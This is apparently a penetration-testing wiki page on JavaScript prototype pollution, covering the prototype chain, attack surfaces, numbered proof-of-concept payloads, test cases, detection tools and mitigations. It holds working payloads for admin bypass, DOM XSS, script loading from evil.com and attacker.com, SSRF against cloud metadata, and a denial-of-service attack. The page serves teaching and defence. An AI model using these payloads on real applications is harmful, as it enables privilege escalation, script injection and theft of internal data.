---
title: Prototype Pollution
---

# Prototype Pollution

Prototype Pollution is a JavaScript vulnerability where an attacker injects arbitrary properties into an object's prototype (such as `Object.prototype` or `Array.prototype`). Since JavaScript objects inherit properties through the prototype chain, a polluted property becomes available to every object that inherits from that prototype, potentially altering application behavior.

Prototype Pollution is **not an exploit by itself**. It is a **state manipulation primitive**. The actual impact depends on whether the application contains **gadgets**—security-sensitive code paths that consume polluted properties. These gadgets can lead to authentication bypass, privilege escalation, DOM XSS, Denial of Service (DoS), Server-Side Request Forgery (SSRF), or even Remote Code Execution (RCE) in specific scenarios.

Common causes include:

- Unsafe recursive/deep merge functions
- Dynamic object property assignment using user input
- Parsing untrusted JSON into application objects
- Vulnerable third-party libraries (e.g., Lodash, jQuery)
- Failure to validate dangerous property names such as `__proto__`, `prototype`, and `constructor`

---

# Understanding Prototype Pollution Fundamentals

## JavaScript Prototype Chain

Every JavaScript object inherits properties from another object called its **prototype**.

Property lookup follows this order:

```
Object
   │
   ▼
Object.prototype
   │
   ▼
null
```

When JavaScript cannot find a property inside the object itself, it automatically searches its prototype chain.

Example:

```
Object.prototype.role="admin";

constuser= {};

console.log(user.role);
// admin
```

Although `role` was never assigned to `user`, JavaScript retrieves it from `Object.prototype`.

This inheritance behavior is what attackers abuse.

---

## How Prototype Pollution Happens

Prototype Pollution occurs when applications copy user-controlled properties into application objects without validating dangerous keys.

Typical vulnerable code:

```
functionmerge(target,source) {
for (constkeyinsource) {

if (
typeoftarget[key]==="object"&&
typeofsource[key]==="object"
        ) {
merge(target[key],source[key]);

        }else {
target[key]=source[key];
        }
    }
}
```

If user input contains:

```
{
    "__proto__": {
        "isAdmin":true
    }
}
```

then

```
merge({},payload);

console.log({}.isAdmin);
// true
```

Instead of adding a property to a single object, the application modifies `Object.prototype`.

Every newly created object now inherits `isAdmin`.

---

## Prototype Pollution Flow

```
User Input
      │
      ▼
Unsafe Merge / Object Assignment
      │
      ▼
Object.prototype Modified
      │
      ▼
Application Objects Inherit Polluted Property
      │
      ▼
Security Gadget Consumes Property
      │
      ▼
Authentication Bypass
Privilege Escalation
DOM XSS
RCE
DoS
```

---

## Common Dangerous Properties

Most prototype pollution attacks target one of these properties.

| Property | Purpose |
| --- | --- |
| `__proto__` | Direct prototype modification |
| `constructor.prototype` | Alternative prototype path that bypasses simple filters |
| `prototype` | Used by constructors and classes |

Example:

```
{
    "__proto__": {
        "admin":true
    }
}
```

Alternative payload:

```
{
    "constructor": {
        "prototype": {
            "admin":true
        }
    }
}
```

---

## Why Prototype Pollution Becomes Dangerous

Polluting the prototype alone usually has no visible effect.

The application becomes vulnerable only when some code reads the polluted property.

Example:

```
if (user.isAdmin) {

renderAdminPanel();

}
```

If

```
user.isAdmin
```

does not exist,

JavaScript automatically checks

```
Object.prototype.isAdmin
```

If polluted:

```
Object.prototype.isAdmin=true;
```

every user becomes an administrator.

---

## Common Gadgets

Prototype pollution becomes exploitable when polluted properties reach security-sensitive sinks.

Common gadgets include:

Authentication

```
if (user.isAdmin)
```

Authorization

```
if (config.enabled)
```

Command execution

```
child_process.exec(config.command)
```

DOM manipulation

```
element.innerHTML=options.html
```

Script loading

```
script.src=config.url
```

HTTP requests

```
fetch(config.url)
```

Template rendering

```
template.render(options)
```

JSON serialization

```
JSON.stringify(config)
```

---

## Common Sources of Prototype Pollution

Prototype Pollution is frequently introduced through:

- Recursive merge functions
- Deep merge utilities
- Object assignment helpers
- Configuration merging
- Dynamic property setters
- User-controlled JSON parsing
- URL parameter parsing
- Cookie parsing
- Query string libraries
- Vulnerable third-party packages

---

# Attack Surface

Prototype Pollution can occur anywhere user-controlled input is converted into JavaScript objects.

## REST APIs

Applications accepting JSON request bodies.

Example:

```
POST /api/profile

{
    "__proto__": {
        "isAdmin": true
    }
}
```

---

## GraphQL

GraphQL variables often become JavaScript objects.

Example:

```
{
    "variables": {
        "__proto__": {
            "debug":true
        }
    }
}
```

---

## WebSocket Messages

JSON messages processed over WebSockets.

Example:

```
{
    "__proto__": {
        "authenticated":true
    }
}
```

---

## URL Parameters

Client-side applications frequently convert query parameters into objects.

Example

```
?__proto__[isAdmin]=true
```

---

## URL Fragments

```
#__proto__[debug]=true
```

---

## Cookies

Applications parsing cookies into objects.

```
prefs={"__proto__":{"admin":true}}
```

---

## Form Parameters

```
__proto__[admin]=true
```

---

## Multipart Requests

File upload endpoints that deserialize form fields.

---

## Configuration Endpoints

```
POST /settings
```

Applications often merge received settings into runtime configuration.

---

## Feature Flag APIs

Configuration objects used to enable or disable application functionality.

---

## User Preference APIs

Applications storing arbitrary JSON preferences.

---

## Admin Configuration Panels

Administrative settings merged into global configuration.

---

## Session Objects

Applications merging user preferences into session objects.

---

## Vulnerable Third-Party Libraries

Historically vulnerable libraries include:

- Lodash (`_.merge`, `_.defaultsDeep`)
- jQuery (`$.extend(true, ...)`)
- Hoek
- merge
- deepmerge (older versions)
- node-forge (historical cases)

---

# Exploitation Techniques & Practical PoCs

## 1. Direct Prototype Injection

The simplest attack directly modifies `Object.prototype` using `__proto__`.

Payload:

```
{
    "__proto__": {
        "isAdmin":true
    }
}
```

If merged unsafely:

```
merge(config,payload);

console.log({}.isAdmin);

// true
```

---

## 2. Constructor Prototype Pollution

Applications often blacklist `__proto__` but forget that the same prototype can be reached through `constructor.prototype`.

Payload:

```
{
    "constructor": {
        "prototype": {
            "isAdmin":true
        }
    }
}
```

Useful against applications filtering only:

```
__proto__
```

---

## 3. Recursive Merge Pollution

Unsafe recursive merge functions are the most common source.

Example:

```
merge(target,JSON.parse('{
"__proto__":{
"debug":true
    }
}'));
```

Result:

```
({}).debug

// true
```

---

## 4. Client-Side Prototype Pollution

Single Page Applications often convert URL parameters into JavaScript objects.

Example URL

```
https://target.com/

?__proto__[transport_url]=https://evil.com/x.js
```

Application:

```
script.src=config.transport_url;
```

After pollution:

```
config.transport_url

↓

Object.prototype.transport_url

↓

https://evil.com/x.js
```

Potential impact:

- DOM XSS
- Remote JavaScript execution
- Account takeover

---

## 5. Server-Side Prototype Pollution

Node.js applications frequently merge request bodies.

Example:

```
POST /profile

{
    "__proto__":{
        "isAdmin":true
    }
}
```

Later:

```
if(user.isAdmin){

renderAdmin();

}
```

Every user inherits:

```
isAdmin=true
```

Result:

```
Privilege Escalation
```

---

## 6. Authentication Bypass

Application:

```
if(currentUser.isAdmin){

allowAccess();

}
```

Payload:

```
{
    "__proto__":{
        "isAdmin":true
    }
}
```

Outcome:

```
Non-admin user gains administrator access.
```

---

## 7. Feature Flag Manipulation

Many applications use configuration objects.

Example:

```
if(config.debug){

...
}
```

Payload:

```
{
    "__proto__":{
        "debug":true
    }
}
```

Application enters debug mode.

---

## 8. DOM XSS Gadget

Application:

```
element.innerHTML=options.content;
```

Payload:

```
{
    "__proto__":{
        "content":"<img src=x onerror=alert(document.domain)>"
    }
}
```

If inherited:

```
DOM XSS
```

---

## 9. Script Source Injection

Application:

```
script.src=config.url;
```

Payload:

```
{
    "__proto__":{
        "url":"https://evil.com/x.js"
    }
}
```

Outcome:

```
External JavaScript execution
```

---

## 10. SSRF Gadget

Application:

```
fetch(config.endpoint)
```

Payload:

```
{
    "__proto__":{
        "endpoint":"http://169.254.169.254/latest/meta-data/"
    }
}
```

Potential impact:

- SSRF
- Cloud metadata disclosure

---

## 11. Child Process Gadget (Node.js)

Application:

```
child_process.exec(config.command)
```

Payload:

```
{
    "__proto__":{
        "command":"whoami"
    }
}
```

If inherited:

```
Potential Remote Code Execution
```

Depends entirely on the application gadget.

---

## 12. Denial of Service

Payload:

```
{
    "__proto__":{
        "toString":null
    }
}
```

Many libraries expect `toString()` to exist.

Applications may crash with:

```
TypeError
```

---

## 13. Query Parameter Injection

```
GET /?

__proto__[admin]=true
```

Alternative:

```
constructor[prototype][admin]=true
```

---

## 14. Nested Object Bypass

Applications validating only top-level keys can often be bypassed.

Payload:

```
{
    "profile":{
        "preferences":{
            "__proto__":{
                "admin":true
            }
        }
    }
}
```

Recursive merge eventually reaches the malicious property.

---

## 15. JSON Pollution

```
{
    "__proto__":{
        "polluted":"yes"
    }
}
```

Merged using:

```
Object.assign(target,payload)
```

or

```
merge(target,payload)
```

---

## 16. Cookie-Based Pollution

```
Cookie:

prefs={"__proto__":{"debug":true}}
```

Applications parsing cookies into objects may pollute runtime state.

---

## 17. GraphQL Variables

```
{
    "variables":{
        "__proto__":{
            "admin":true
        }
    }
}
```

Useful when GraphQL variables are merged into resolver objects.

---

## 18. Framework-Specific Examples

### Lodash

Historically vulnerable:

```
_.merge(target,payload)
```

Payload:

```
{
    "__proto__":{
        "admin":true
    }
}
```

---

### jQuery

```
$.extend(true,target,payload)
```

Older versions allowed prototype pollution.

---

### Express Applications

```
merge(config,req.body)
```

Common source of Server-Side Prototype Pollution.

---

### Vue / React Configuration Objects

Polluting runtime configuration may alter rendering logic depending on application-specific gadgets.

---

# **Test Cases & Detection Techniques**

## Test Cases

### 1. Basic Prototype Pollution Detection

**Payload**

```
{
    "__proto__": {
        "polluted": "true"
    }
}
```

**Verification**  

Execute in browser console or Node.js environment:

```
({}).polluted
```

**Vulnerable Output**

```
true
```

**Secure Output**

```
undefined
```

### 2. Constructor.prototype Pollution Test

Used when `__proto__` filtering is implemented.

**Payload**

```
{
    "constructor": {
        "prototype": {
            "polluted": "true"
        }
    }
}
```

**Verification**

```
({}).polluted
```

**Vulnerable If**

```
true
```

### 3. JSON Body Pollution Test

**Request**

```
POST /api/profile/update HTTP/1.1
Content-Type: application/json

{
    "__proto__":{
        "admin":true
    }
}
```

**Test**  

After request, check application behavior:

```
({}).admin
```

**Expected Secure Behavior**

```
undefined
```

### 4. Query Parameter Pollution Test

**Payloads**

```
?__proto__[admin]=true
```

or

```
?constructor[prototype][admin]=true
```

**Check**

```
Object.prototype.admin
```

### 5. Client-Side Prototype Pollution Test

**Payload**

```
https://target.com/?__proto__[test]=polluted
```

**Browser Console**

```
Object.prototype.test
```

**Vulnerable:**

```
polluted
```

### 6. Authentication Bypass Test

**Payload**

```
{
    "__proto__":{
        "isAdmin":true
    }
}
```

**Application Logic**

```
if(user.isAdmin){
    accessAdminPanel();
}
```

**Vulnerable If**  

Normal user receives administrator privileges.

### 7. Role Manipulation Test

**Payload**

```
{
    "__proto__":{
        "role":"admin"
    }
}
```

**Check:**

```
user.role
```

Expected:

```
admin
```

### 8. Feature Flag Manipulation

**Payload**

```
{
    "__proto__":{
        "debug":true
    }
}
```

**Test**  

Observe whether:

- Debug mode enabled
- Hidden functionality exposed
- Internal endpoints accessible

### 9. DOM XSS Gadget Test

**Payload**

```
{
    "__proto__":{
        "innerHTML":"<img src=x onerror=alert(1)>"
    }
}
```

**Vulnerable If**  

Polluted value reaches: `element.innerHTML`  and JavaScript executes.

### 10. Script Injection Gadget Test

**Payload**

```
{
    "__proto__":{
        "url":"https://attacker.com/script.js"
    }
}
```

**Check For:**

```
script.src
```

**Vulnerable If**  

External script loads.

### 11. SSRF Gadget Test

**Payload**

```
{
    "__proto__":{
        "url":"http://169.254.169.254/latest/meta-data/"
    }
}
```

**Vulnerable If**  

Application performs server-side requests using polluted value.

### 12. Denial of Service Test

**Payload**

```
{
    "__proto__":{
        "toString":null
    }
}
```

**Observe:**

- Application errors
- Unexpected crashes
- Failed object processing

## Detection Techniques

### A. Manual Detection

#### Identify Object Manipulation Points

Look for:

- JSON merge operations
- User preference storage
- Configuration updates
- Query string parsing
- Cookie parsing
- Dynamic object assignment

Common vulnerable patterns:

```
Object.assign(target,input)

_.merge(target,input)

merge(target,req.body)

for(key in input){
    obj[key]=input[key]
}
```

#### Test Dangerous Keys

Send:

```
__proto__constructorprototype
```

Example:

```
{ "__proto__":{    "test":"123" }}
```

#### Verify Pollution

Browser:

```
Object.prototype.test
```

Node.js:

```
console.log({}.test)
```

Vulnerable:

```
123
```

Secure:

```
undefined
```

#### Analyze Application Behavior

Check for:

- New privileges
- Modified roles
- Changed configuration
- Unexpected redirects
- External requests
- Script execution
- Application errors

# Inspect JavaScript Files

Search frontend JavaScript for:

```
__proto__
prototype
constructor
merge
extend
assign
clone
defaultsDeep
```

Tools:

- Browser DevTools
- Burp Suite
- grep
- JS-beautifier

Example:

```
grep-R"__proto__" app.js
```

---

# Dependency Analysis

Check vulnerable packages.

Node.js:

```
npm audit
```

Search:

```
package.json
package-lock.json
```

Look for:

```
lodash
jquery
merge
deepmerge
hoek
```

---

# B. Automated Detection

---

## Burp Suite

Use:

- Proxy
- Repeater
- Intruder
- DOM Invader

Test payloads:

```
__proto__[polluted]=true
constructor[prototype][polluted]=true
```

---

## DOM Invader

Burp DOM Invader can detect:

- Client-side prototype pollution
- Dangerous sources
- Exploitable gadgets

---

## Nuclei

Example:

```
nuclei-u https://target.com \
-tags prototype-pollution
```

---

## Semgrep

Search vulnerable patterns:

```
semgrep--config=p/javascript .
```

Detect:

- Unsafe object assignments
- Prototype manipulation

---

## CodeQL

Useful for identifying:

- User input flowing into object merge functions
- Prototype modification paths

---

## Dependency Scanners

Tools:

```
npm audit
```

```
snyk test
```

Detect vulnerable npm packages.

---

# Impact

- **Authentication Bypass**
Attackers can modify authorization properties such as `isAdmin`, `role`, or permission flags.
- **Privilege Escalation**
Normal users may gain administrative privileges if authorization checks rely on inherited properties.
- **DOM XSS**
Client-side gadgets may use polluted properties in dangerous sinks like `innerHTML`, `script.src`, or DOM manipulation functions.
- **Remote Code Execution (RCE)**
In Node.js applications, prototype pollution combined with command execution gadgets can result in server compromise.
- **Server-Side Request Forgery (SSRF)**
Polluted configuration values may redirect backend requests to attacker-controlled or internal resources.
- **Security Configuration Bypass**
Attackers may modify feature flags, debug settings, or application configurations.
- **Denial of Service (DoS)**
Polluted built-in properties can break application logic and cause runtime exceptions.
- **Cross-User Impact**
Since prototypes are shared globally, a single successful pollution attack may affect multiple users.

---

# Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite Professional | Manual testing, payload injection, DOM analysis |
| Burp DOM Invader | Client-side prototype pollution detection |
| Nuclei | Automated vulnerability detection templates |
| Semgrep | Static analysis for vulnerable JavaScript patterns |
| CodeQL | Source-code data flow analysis |
| Snyk | Dependency vulnerability scanning |
| npm audit | Node.js dependency security checks |
| Retire.js | Detect vulnerable JavaScript libraries |
| DevTools Console | Verify prototype pollution |
| JS-beautifier | Analyze minified JavaScript |

---

# Prevention & Mitigation

## Block Dangerous Properties

Reject:

```
__proto__
prototype
constructor
```

Example:

```
constblocked= [
"__proto__",
"prototype",
"constructor"
];
```

---

## Validate User Input

Do not directly merge user-controlled objects.

Bad:

```
Object.assign(config,userInput)
```

Good:

```
schema.validate(userInput)
```

Use:

- JSON Schema
- Joi
- Zod
- Yup

---

## Avoid Unsafe Deep Merge Functions

Avoid:

```
_.merge(target,input)
```

without validation.

Use updated libraries.

---

## Use Object.create(null)

Normal object:

```
constobj= {};
```

inherits:

```
Object.prototype
```

Safer:

```
constobj=Object.create(null);
```

No prototype inheritance.

---

## Use hasOwnProperty Checks

Bad:

```
if(user.isAdmin)
```

Better:

```
if(
Object.prototype.hasOwnProperty.call(user,"isAdmin")
)
```

Prevents inherited properties from being trusted.

---

## Freeze Object Prototypes

Example:

```
Object.freeze(Object.prototype);
```

Prevents modification of built-in prototypes.

---

## Update Dependencies

Keep packages updated:

```
npm update
```

Regularly review:

```
npm audit
```

---

## Secure Object Merging

Use safe merge libraries that:

- Block prototype keys
- Validate object paths
- Prevent recursive prototype modification

---

## Disable Dangerous Object Mutation

Avoid:

```
obj[userInput]=value;
```

when keys are user controlled.

---

# Good To Read

## Research Papers

- [Client-side prototype pollution](https://www.ndss-symposium.org/wp-content/uploads/2022-308-paper.pdf)
- [Server-side prototype pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)

---

## Notable Vulnerabilities

### [CVE-2019-11358](https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006)

jQuery `$.extend(true,...)` prototype pollution vulnerability.

Impact:

- Client-side prototype pollution
- DOM XSS

---

### Lodash Prototype Pollution

[https://security.snyk.io/vuln/SNYK-JS-LODASH-608086](https://security.snyk.io/vuln/SNYK-JS-LODASH-608086)

[https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838](https://security.snyk.io/vuln/SNYK-JS-LODASH-15053838)

Affected functions:

```
_.merge()
_.defaultsDeep()
```

Impact:

- Authentication bypass
- Remote code execution in specific applications

---

### [Kibana Prototype Pollution](https://security.snyk.io/vuln/SNYK-JS-KIBANA-9376712)

Prototype pollution vulnerabilities affecting Elasticsearch/Kibana components.

---

# References

- PortSwigger Web Security Academy - Prototype Pollution[https://portswigger.net/web-security/prototype-pollution](https://portswigger.net/web-security/prototype-pollution)
- OWASP JavaScript Security Cheat Sheet[https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
- Snyk Prototype Pollution Research[https://snyk.io/blog/prototype-pollution-javascript/](https://snyk.io/blog/prototype-pollution-javascript/)
- HackTricks - Prototype Pollutionhttps://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
- PayloadsAllTheThings - Prototype Pollution[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- Lodash Security Advisories[https://security.snyk.io/package/npm/lodash](https://security.snyk.io/package/npm/lodash)
- NPM Security Audit[https://docs.npmjs.com/cli/v10/commands/npm-audit](https://docs.npmjs.com/cli/v10/commands/npm-audit)